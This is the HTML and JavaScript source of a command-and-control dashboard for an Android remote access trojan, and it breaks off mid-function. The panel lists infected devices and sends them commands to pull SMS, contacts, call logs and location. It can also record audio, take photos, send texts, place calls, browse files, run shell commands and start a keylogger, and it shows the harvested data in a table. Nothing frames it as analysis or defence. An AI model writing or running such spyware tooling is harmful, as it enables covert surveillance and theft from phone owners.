<!DOCTYPE html>
<html>
<head>
    <title>RAT C2 Dashboard</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        body { background: #1a1a1a; color: #fff; }
        .card { background: #2d2d2d; border: 1px solid #444; }
        .device-online { border-left: 5px solid #28a745; }
        .device-offline { border-left: 5px solid #dc3545; }
        .table-dark { background: #2d2d2d; }
        .command-btn { margin: 2px; }
        .terminal { 
            background: #000; 
            color: #0f0; 
            font-family: monospace; 
            height: 400px; 
            overflow-y: auto;
            padding: 10px;
            white-space: pre-wrap;
        }
        .file-list { max-height: 300px; overflow-y: auto; }
    </style>
</head>
<body>
    <nav class="navbar navbar-dark bg-dark">
        <div class="container-fluid">
            <span class="navbar-brand">
                <i class="fas fa-robot"></i> RAT C2 Dashboard
            </span>
            <span class="text-muted" id="connectionStatus">
                <i class="fas fa-circle text-danger"></i> Disconnected
            </span>
        </div>
    </nav>

    <div class="container-fluid mt-3">
        <div class="row">
            <!-- Devices Panel -->
            <div class="col-md-4">
                <div class="card">
                    <div class="card-header">
                        <h5><i class="fas fa-mobile-alt"></i> Connected Devices</h5>
                    </div>
                    <div class="card-body" id="devicesList">
                        <div class="text-center">
                            <div class="spinner-border text-primary" role="status">
                                <span class="visually-hidden">Loading...</span>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Command Panel -->
                <div class="card mt-3">
                    <div class="card-header">
                        <h5><i class="fas fa-terminal"></i> Quick Commands</h5>
                    </div>
                    <div class="card-body">
                        <div class="row" id="quickCommands">
                            <!-- Quick commands will be loaded here -->
                        </div>
                        <div class="mt-3" id="commandParams">
                            <textarea class="form-control bg-dark text-light" 
                                      rows="3" placeholder="Command parameters (JSON)"
                                      id="paramsInput"></textarea>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Main Panel -->
            <div class="col-md-8">
                <div class="card">
                    <div class="card-header">
                        <ul class="nav nav-tabs card-header-tabs" id="mainTabs">
                            <li class="nav-item">
                                <a class="nav-link active" data-bs-toggle="tab" href="#tabTerminal">
                                    <i class="fas fa-terminal"></i> Terminal
                                </a>
                            </li>
                            <li class="nav-item">
                                <a class="nav-link" data-bs-toggle="tab" href="#tabFiles">
                                    <i class="fas fa-folder-open"></i> Files
                                </a>
                            </li>
                            <li class="nav-item">
                                <a class="nav-link" data-bs-toggle="tab" href="#tabData">
                                    <i class="fas fa-database"></i> Collected Data
                                </a>
                            </li>
                        </ul>
                    </div>
                    <div class="card-body">
                        <div class="tab-content">
                            <!-- Terminal Tab -->
                            <div class="tab-pane fade show active" id="tabTerminal">
                                <div class="terminal" id="terminalOutput">
                                    [SYSTEM] C2 Dashboard initialized
                                    [SYSTEM] Waiting for devices...
                                </div>
                                <div class="input-group mt-2">
                                    <input type="text" class="form-control bg-dark text-light" 
                                           id="commandInput" placeholder="Enter command...">
                                    <button class="btn btn-primary" onclick="sendManualCommand()">
                                        <i class="fas fa-paper-plane"></i> Send
                                    </button>
                                </div>
                            </div>

                            <!-- Files Tab -->
                            <div class="tab-pane fade" id="tabFiles">
                                <div class="file-list" id="fileList">
                                    No files available
                                </div>
                                <button class="btn btn-success mt-2" onclick="refreshFiles()">
                                    <i class="fas fa-sync"></i> Refresh Files
                                </button>
                            </div>

                            <!-- Data Tab -->
                            <div class="tab-pane fade" id="tabData">
                                <select class="form-select bg-dark text-light mb-2" id="dataTypeSelect">
                                    <option value="all">All Data Types</option>
                                    <option value="sms">SMS</option>
                                    <option value="contacts">Contacts</option>
                                    <option value="call_logs">Call Logs</option>
                                    <option value="location">Location</option>
                                    <option value="audio">Audio Recordings</option>
                                    <option value="photo">Photos</option>
                                </select>
                                <div class="table-responsive">
                                    <table class="table table-dark table-striped">
                                        <thead>
                                            <tr>
                                                <th>Type</th>
                                                <th>Date</th>
                                                <th>Data</th>
                                                <th>Actions</th>
                                            </tr>
                                        </thead>
                                        <tbody id="dataTable">
                                            <!-- Data rows will be inserted here -->
                                        </tbody>
                                    </table>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Selected Device Info -->
                <div class="card mt-3">
                    <div class="card-header">
                        <h5><i class="fas fa-info-circle"></i> Device Information</h5>
                    </div>
                    <div class="card-body" id="deviceInfo">
                        Select a device to view details
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Modals -->
    <div class="modal fade" id="commandModal" tabindex="-1">
        <div class="modal-dialog modal-lg">
            <div class="modal-content bg-dark text-light">
                <div class="modal-header">
                    <h5 class="modal-title">Send Command</h5>
                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
                </div>
                <div class="modal-body">
                    <div class="mb-3">
                        <label class="form-label">Device:</label>
                        <input type="text" class="form-control bg-dark text-light" 
                               id="modalDeviceId" readonly>
                    </div>
                    <div class="mb-3">
                        <label class="form-label">Command:</label>
                        <select class="form-select bg-dark text-light" id="modalCommandSelect">
                            <option value="1">Get Device Info</option>
                            <option value="2">Get SMS</option>
                            <option value="3">Get Contacts</option>
                            <option value="4">Get Call Logs</option>
                            <option value="5">Get Location</option>
                            <option value="6">Record Audio</option>
                            <option value="7">Take Photo</option>
                            <option value="8">Send SMS</option>
                            <option value="9">Make Call</option>
                            <option value="10">Get Files</option>
                            <option value="11">Execute Shell</option>
                            <option value="12">Start Keylogger</option>
                            <option value="13">Stop Keylogger</option>
                        </select>
                    </div>
                    <div class="mb-3">
                        <label class="form-label">Parameters (JSON):</label>
                        <textarea class="form-control bg-dark text-light" 
                                  rows="5" id="modalParams"></textarea>
                        <small class="text-muted">
                            Example: {"number": "+1234567890", "message": "Hello"}
                        </small>
                    </div>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                    <button type="button" class="btn btn-primary" onclick="sendCommand()">
                        <i class="fas fa-paper-plane"></i> Send Command
                    </button>
                </div>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        let ws;
        let selectedDevice = null;
        const quickCommands = [
            {id: 1, name: "ðŸ“± Info", icon: "fa-info", params: "{}"},
            {id: 2, name: "ðŸ“¨ SMS", icon: "fa-sms", params: "{}"},
            {id: 3, name: "ðŸ‘¥ Contacts", icon: "fa-address-book", params: "{}"},
            {id: 5, name: "ðŸ“ Location", icon: "fa-location-crosshairs", params: "{}"},
            {id: 6, name: "ðŸŽ¤ Record Audio", icon: "fa-microphone", params: '{"duration": 30}'},
            {id: 7, name: "ðŸ“¸ Photo", icon: "fa-camera", params: "{}"},
            {id: 10, name: "ðŸ“ Files", icon: "fa-folder", params: '{"path": "/sdcard"}'}
        ];

        function connectWebSocket() {
            const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
            const wsUrl = `${protocol}//${window.location.host}`;
            
            ws = new WebSocket(wsUrl);
            
            ws.onopen = () => {
                document.getElementById('connectionStatus').innerHTML = 
                    '<i class="fas fa-circle text-success"></i> Connected';
                logToTerminal('[SYSTEM] WebSocket connected');
            };
            
            ws.onclose = () => {
                document.getElementById('connectionStatus').innerHTML = 
                    '<i class="fas fa-circle text-danger"></i> Disconnected';
                logToTerminal('[SYSTEM] WebSocket disconnected');
                setTimeout(connectWebSocket, 3000);
            };
            
            ws.onmessage = (event) => {
                const data = JSON.parse(event.data);
                handleWebSocketMessage(data);
            };
        }

        function handleWebSocketMessage(data) {
            switch(data.type) {
                case 'devices_list':
                    updateDevicesList(data.data);
                    break;
                case 'command_sent':
                    logToTerminal(`[COMMAND] Sent to device: ${data.data.device_id}`);
                    break;
            }
        }

        function updateDevicesList(devices) {
            const container = document.getElementById('devicesList');
            if (devices.length === 0) {
                container.innerHTML = '<div class="text-center text-muted">No devices connected</div>';
                return;
            }
            
            let html = '';
            devices.forEach(device => {
                const lastSeen = new Date(device.last_seen);
                const now = new Date();
                const diffMinutes = Math.floor((now - lastSeen) / 60000);
                const isOnline = diffMinutes < 5;
                
                html += `
                <div class="card mb-2 ${isOnline ? 'device-online' : 'device-offline'}" 
                     onclick="selectDevice('${device.device_id}')"
                     style="cursor: pointer;">
                    <div class="card-body p-2">
                        <div class="d-flex justify-content-between">
                            <div>
                                <strong>${device.device_id}</strong><br>
                                <small class="text-muted">
                                    ${device.model || 'Unknown'} | Android ${device.android_version || 'Unknown'}
                                </small>
                            </div>
                            <div class="text-end">
                                <span class="badge ${isOnline ? 'bg-success' : 'bg-danger'}">
                                    ${isOnline ? 'ONLINE' : 'OFFLINE'}
                                </span><br>
                                <small class="text-muted">${diffMinutes} min ago</small>
                            </div>
                        </div>
                    </div>
                </div>`;
            });
            
            container.innerHTML = html;
            
            // Update quick commands
            updateQuickCommands();
        }

        function selectDevice(deviceId) {
            selectedDevice = deviceId;
            document.getElementById('modalDeviceId').value = deviceId;
            
            // Load device info
            fetch(`/devices`)
                .then(r => r.json())
                .then(devices => {
                    const device = devices.find(d => d.device_id === deviceId);
                    if (device) {
                        document.getElementById('deviceInfo').innerHTML = `
                            <table class="table table-dark">
                                <tr><th>Device ID:</th><td>${device.device_id}</td></tr>
                                <tr><th>Model:</th><td>${device.model || 'Unknown'}</td></tr>
                                <tr><th>Android:</th><td>${device.android_version || 'Unknown'}</td></tr>
                                <tr><th>IP Address:</th><td>${device.ip_address || 'Unknown'}</td></tr>
                                <tr><th>Last Seen:</th><td>${new Date(device.last_seen).toLocaleString()}</td></tr>
                            </table>
                        `;
                    }
                });
            
            logToTerminal(`[SYSTEM] Selected device: ${deviceId}`);
        }

        function updateQuickCommands() {
            const container = document.getElementById('quickCommands');
            let html = '';
            
            quickCommands.forEach(cmd => {
                html += `
                <div class="col-6 col-md-4 mb-2">
                    <button class="btn btn-outline-info w-100 command-btn" 
                            onclick="sendQuickCommand(${cmd.id}, '${cmd.params}')">
                        <i class="fas ${cmd.icon}"></i> ${cmd.name}
                    </button>
                </div>`;
            });
            
            container.innerHTML = html;
        }

        function sendQuickCommand(commandId, params) {
            if (!selectedDevice) {
                alert('Please select a device first!');
                return;
            }
            
            const command = {
                type: 'send_command',
                device_id: selectedDevice,
                command: commandId,
                params: JSON.parse(params)
            };
            
            ws.send(JSON.stringify(command));
            logToTerminal(`[COMMAND] Quick command ${commandId} sent to ${selectedDevice}`);
        }

        function openCommandModal() {
            if (!selectedDevice) {
                alert('Please select a device first!');
                return;
            }
            
            const modal = new bootstrap.Modal(document.getElementById('commandModal'));
            modal.show();
        }

        function sendCommand() {
            const deviceId = document.getElementById('modalDeviceId').value;
            const commandId = parseInt(document.getElementById('modalCommandSelect').value);
            const paramsText = document.getElementById('modalParams').value;
            
            let params = {};
            try {
                params = paramsText ? JSON.parse(paramsText) : {};
            } catch (e) {
                alert('Invalid JSON parameters!');
                return;
            }
            
            const command = {
                type: 'send_command',
                device_id: deviceId,
                command: commandId,
                params: params
            };
            
            ws.send(JSON.stringify(command));
            logToTerminal(`[COMMAND] Command ${commandId} sent to ${deviceId}`);
            
            bootstrap.Modal.getInstance(document.getElementById('commandModal')).hide();
        }

        function loadData() {
            if (!selectedDevice) return;
            
            const dataType = document.getElementById('dataTypeSelect').value;
            
            fetch(`/data/${selectedDevice}?type=${dataType}`)
                .then(r => r.json())
                .then(data => {
                    const tbody = document.getElementById('dataTable');
                    let html = '';
                    
                    data.forEach(row => {
                        const date = new Date(row.created_at).toLocaleString();
                        let preview = row.data;
                        if (preview.length > 100) {
                            preview = preview.substring(0, 100) + '...';
                        }
                        
                        html += `
                        <tr>
                            <td>${row.data_type}</td>
                            <td>${date}</td>
                            <td><small>${preview}</small></td>
                            <td>
                                <button class="btn btn-sm btn-info" onclick="viewData(${row.id})">
                                    <i class="fas fa-eye"></i>
                                </button>
                                ${row.file_path ? `
                                <button class="btn btn-sm btn-success" 
                           
